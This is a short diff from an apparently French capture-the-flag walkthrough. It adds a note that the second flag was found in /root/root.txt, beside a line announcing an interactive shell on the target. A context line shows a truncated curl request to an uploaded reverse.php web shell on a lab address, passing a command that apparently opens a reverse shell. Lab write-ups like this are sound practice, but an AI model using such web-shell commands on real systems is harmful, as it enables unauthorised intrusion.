@@ -253,6 +253,9 @@ curl "http://192.168.1.4/assets/fonts/blog/wp-content/uploads/reverse.php?cmd=ba
 
 ![image](https://github.com/user-attachments/assets/1ab4938a-cb6a-4a3a-889c-5c0fa0b8b83f)
 
+- **Deuxième flag** : J'ai trouvé le deuxième flag dans `/root/root.txt`.
+
+![image](https://github.com/user-attachments/assets/056e29c7-5402-489e-9694-2013c5954f56)
 
 ✅ **Nous obtenons un shell interactif sur la machine cible !**
 
